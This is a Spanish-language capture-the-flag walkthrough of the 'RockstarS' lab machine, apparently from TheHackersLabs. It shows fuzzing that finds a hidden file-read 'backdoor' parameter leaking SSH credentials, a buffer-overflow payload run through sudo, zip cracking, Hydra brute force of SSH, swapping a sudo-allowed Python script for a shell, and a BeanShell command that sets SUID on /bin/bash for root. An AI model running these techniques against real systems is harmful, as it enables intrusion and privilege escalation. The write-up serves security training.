En primer lugar, se saca la IP del objetivo

```zsh
sudo netdiscover

 10 Captured ARP Req/Rep packets, from 10 hosts.   Total size: 600                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
...
 192.168.1.145   08:00:27:e1:06:26      1      60  PCS Systemtechnik GmbH                                                       ...   
```

Una vez descubierta la IP, se analizan los puertos, en este caso, no parece haber gran cosa más allá de un servidor SSH y una Web.

```zsh
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)  
| ssh-hostkey:    
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)  
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)  
80/tcp open  http    Apache httpd 2.4.62 ((Debian))  
|_http-title: Site doesn't have a title (text/html).  
|_http-server-header: Apache/2.4.62 (Debian)
```

Al visitar la página lo único que hay es nada, una página totalmente vacía. Un fuzzing rápido revela un par de archivos bastante sospechosos.

```zsh
ffuf -u http://192.168.1.145/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt  -fc 404 -c  
...
index.html              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]  
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]    
index.php               [Status: 500, Size: 19, Words: 5, Lines: 1, Duration: 431ms]  
wp-forum.phps           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]  
```

# Parámetro oculto
Por mucho fuzzing que se haga en `index.php`, el candidato más probable a ser un vector de ataque, no obtengo nada más que un código de error 500 y un string: "Yo no soy tu marido". Se intenta de todo, fuzzear User-Agents, cookies, parámetros URL... Con diccionarios comunes, diccionarios custom de Nicky Jam (por la canción que referencia el contenido de la página), nada da resultado.

Después de varios de días volviéndome loco e intentando cosas de lo más dantescas, pero convencido de que `index.php` es el punto de entrada, doy con la tecla. Usando `x8`, una herramienta que encuentra parámetros ocultos, identifico que a través del contenido de `POST` hay un parámetro que no devuelve 500.

```zsh
x8 -u "http://rockstars.thl/index.php" -X POST -b "%s" -w /usr/share/wordlists/dirb/common.txt  
  
urls:         http://rockstars.thl/index.php  
methods:      POST  
wordlist len: 4614  
  
POST http://rockstars.thl/index.php (500) [163] {0}  
[info] Amount of parameters per request - 512  
backdoor: code 500 -> 200  
  
POST http://rockstars.thl/index.php % backdoor
```

Llegados a este punto, está claro como se puede usar ese parámetro y que archivo debemos leer.

```zsh
curl -X POST http://rockstars.thl/index.php -d "backdoor=db.php"      
Yo no soy tu marido<?php  
$usuario = "shark";  
$contrasena = "djbasdnbasdas&$AAAALLthl";    
?>
```

Probamos esas claves por SSH y accedemos como el usuario *shark*.

```zsh
sh shark@192.168.1.145                                           
shark@192.168.1.145's password:    
Linux TheHackersLabs-RockstarS 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64  
  
          /^\/^\  
        _|__|  O|  
\/     /~     \_/ \  
\____|__________/  \  
       \_______      \  
               `\     \                 \  
                 |     |                  \  
                /      /                    \  
               /     /                       \\  
             /      /                         \ \  
            /     /                            \  \  
          /     /             _----_            \   \  
         /     /           _-~      ~-_         |   |  
        (      (        _-~    _--_    ~-_     _/   |  
         \      ~-____-~    _-~    ~-_    ~-_-~    /  
           ~-_           _-~          ~-_       _-~  
              ~--______-~                ~-___-~  
  
Last login: Thu Mar 12 17:26:30 2026 from 192.168.91.191  
```

# Shark

Al entrar a la máquina y lanzar el primer comando para iniciar la escalada, veo que se puede usar un binario llamado `bof` como el usuario *wvverez*. Al ejecutarlo, se confirma lo que ya sugiere el nombre, hay explotar un buffer overflow para escalar. Aprovechando que tenemos las claves de SSH, me traeré el binario a mi máquina para inspeccionarlo mejor.

```zsh
shark@TheHackersLabs-RockstarS:~$ sudo -l    
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido  
Matching Defaults entries for shark on TheHackersLabs-RockstarS:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User shark may run the following commands on TheHackersLabs-RockstarS:  
   (wvverez) NOPASSWD: /home/shark/bof  
shark@TheHackersLabs-RockstarS:~$ /home/shark/bof  
overflow me :    
xd  
Nah..

scp shark@192.168.1.145:/home/shark/bof .  
shark@192.168.1.145's password:    
bof                                                                                                         100% 7348     4.5MB/s   00:00
```

Utilizando el decompilador Ghidra, identificamos la función del código que nos va a permitir hacer la escalada, junto con el código ASM que le corresponde

```c
void func(int param_1)

{
  int in_GS_OFFSET;
  char local_30 [32];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  puts("overflow me : ");
  gets(local_30);
  if (param_1 == -0x35014542) {
    system("/bin/sh");
  }
  else {
    puts("Nah..");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

Entonces, identificamos la cantidad de bytes que necesitamos para llegar a la dirección que el `if` de arriba compara con el valor `-0x35014542` para evaluar si nos abre una shell o no.

```ASM
        00010649 8d 45 d4        LEA        EAX=>local_30,[EBP + -0x2c] <-- El búfer inicia en (EBP - 44)
        
        
        00010654 81 7d 08        CMP        dword ptr [EBP + Stack[0x4]],0xcafebabe <-- La dirección que queremos 
																					    sobreescribir para cumplir la
																					    condición (if param_1 == 0xcafebebe)
																					    Está en EBP + 8

```

Una vez sabemos la cantidad exacta de byes (44+8=52), los "inyectamos" al binario con python, seguido del payload: "0xcafebebe" en formato Little Endian(`\xbe\xba\xfe\xca`), mantenemos el `stdio` abierto al pipear el output vía `cat` y luego ejecutamos el binario con los privilegios de *wvverez* 

```zsh
shark@TheHackersLabs-RockstarS:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca")'; cat) | sudo -u wvverez /home/shark/bof  
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido  
overflow me :    
id  
  
id  
uid=1002(wvverez) gid=1002(wvverez) grupos=1002(wvverez),100(users)
```

# Wvverez

```zsh
ls  
rubiales.zip  
python3 -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
192.168.1.159 - - [23/Mar/2026 14:49:04] "GET /rubiales.zip HTTP/1.1" 200 -

curl -O http://192.168.1.145:8000/rubiales.zip  
 % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current  
                                Dload  Upload  Total   Spent   Left   Speed  
100    366 100    366   0      0  13022      0                              0
```

Con `frackzip` se crackea el zip y se extraen las contraseñas que contiene

```zsh
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt rubiales.zip    
  
  
PASSWORD FOUND!!!!: pw == princess  


unzip rubiales.zip    
Archive:  rubiales.zip  
[rubiales.zip] passwords.txt password:    
 inflating: passwords.txt              
                                                                                                                                                
cat passwords.txt                           
dadADASJNDAKNd1dadad  
ajdjAsdaddiandas12313  
kmdalskdmasdnmaskj126  
djasndjasndjnasdjna12  
dasdjnasjdknasdasd098  
mkkdjasdasdasdasdada1  
dasdjknadnasjdasjldas5  
dkjandnkasndasjndjasd12  
ldjnansdklnmasldasdd01  
dljnasndkjasndjnasdja12  
gjndkaskdasjdasndansdn  
1dkjnandjkasndjasndjdd  
djnasdnsadjnasldnaldn12  
```

# SSH brute
Con las contraseñas obtenidas se hace un diccionario y se intenta entrar como el usuario *loseey*. Al entrar, recibimos un mensaje interesante.

```zsh
hydra -l loseey -P passwds -s 22 -t 4 ssh://192.168.1.145                     

[DATA] attacking ssh://192.168.1.145:22/  
[22][ssh] host: 192.168.1.145   login: loseey   password: kmdalskdmasdnmaskj126  

ssh loseey@192.168.1.145                
loseey@192.168.1.145's password:    
Linux TheHackersLabs-RockstarS 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64  
  
          /^\/^\  
        _|__|  O|  
\/     /~     \_/ \  
\____|__________/  \  
       \_______      \  
               `\     \                 \  
                 |     |                  \  
                /      /                    \  
               /     /                       \\  
             /      /                         \ \  
            /     /                            \  \  
          /     /             _----_            \   \  
         /     /           _-~      ~-_         |   |  
        (      (        _-~    _--_    ~-_     _/   |  
         \      ~-____-~    _-~    ~-_    ~-_-~    /  
           ~-_           _-~          ~-_       _-~  
              ~--______-~                ~-___-~  
  
You have mail.
```

Podemos ejecutar `python3` vía sudo como el usuario *username3*, pero solo en el script `rubiales.py`. Al hacer ls vemos que no tenemos permisos de escritura.

```zsh
loseey@TheHackersLabs-RockstarS:~$ sudo -l  
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido  
Matching Defaults entries for loseey on TheHackersLabs-RockstarS:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User loseey may run the following commands on TheHackersLabs-RockstarS:  
   (username3) NOPASSWD: /usr/bin/python3 /home/loseey/rubiales.py  

loseey@TheHackersLabs-RockstarS:~$ ls -la  
total 32  
drwxr-xr-x 4 loseey    loseey    4096 mar 12 18:14 .  
drwxr-xr-x 6 root      root      4096 mar  8 13:20 ..  
lrwxrwxrwx 1 root      root         9 mar 12 18:11 .bash_history -> /dev/null  
-rw-r--r-- 1 loseey    loseey     220 mar  8 13:19 .bash_logout  
-rw-r--r-- 1 loseey    loseey    3526 mar  8 13:19 .bashrc  
drwxr-xr-x 3 loseey    loseey    4096 mar  8 13:50 .cache  
drwxr-xr-x 5 loseey    loseey    4096 mar  8 13:50 .local  
-rw-r--r-- 1 loseey    loseey     807 mar  8 13:19 .profile  
-rw-r--r-- 1 username3 username3  191 mar 12 17:54 rubiales.py  
```

Sin embargo, como sí los tenemos en el directorio que contiene el archivo, solo hay que borrar el archivo y crear uno con el mismo nombre que abra una shell.

```zsh
loseey@TheHackersLabs-RockstarS:~$ rm rubiales.py    
rm: ¿borrar el fichero regular 'rubiales.py'  protegido contra escritura? (s/n) s  
loseey@TheHackersLabs-RockstarS:~$ touch rubiales.py  
loseey@TheHackersLabs-RockstarS:~$ nano rubiales.py    
loseey@TheHackersLabs-RockstarS:~$ cat rubiales.py    

import os  
  
os.system("/bin/bash")  


loseey@TheHackersLabs-RockstarS:~$ sudo -u username3 /usr/bin/python3 /home/loseey/rubiales.py    
username3@TheHackersLabs-RockstarS:/home/loseey$ id  
uid=1003(username3) gid=1003(username3) grupos=1003(username3),100(users),113(lxd)  
```

Ya tenemos la flag de user

```zsh
username3@TheHackersLabs-RockstarS:~$ cat user.txt    
********
```

# Root
Como *username3* podemos ejecutar `bsh` con privilegios de root. `bsh` o BeanShell es un interpretador de Java.

```zsh
username3@TheHackersLabs-RockstarS:~$ sudo -l  
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido  
Matching Defaults entries for username3 on TheHackersLabs-RockstarS:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User username3 may run the following commands on TheHackersLabs-RockstarS:  
   (root) NOPASSWD: /usr/bin/bsh
```

Aprovechamos los privilegios del binario para escribir el bit SUID al `bash`. Luego, ejecutando `bash-p` se consigue una shell privilegiada.

```zsh
username3@TheHackersLabs-RockstarS:~$ sudo bsh  
BeanShell 2.0b4 - by Pat Niemeyer (pat@pat.net)  
bsh % Runtime.getRuntime().exec("chmod +s /bin/bash");  
username3@TheHackersLabs-RockstarS:~$ bash -p  
bash-5.2# id  
uid=1003(username3) gid=1003(username3) euid=0(root) egid=0(root) grupos=0(root),100(users),113(lxd),1003(username3)  
bash-5.2# exit  


bash-5.2# ls  
root.txt  
bash-5.2# cat root.txt  
**********************
```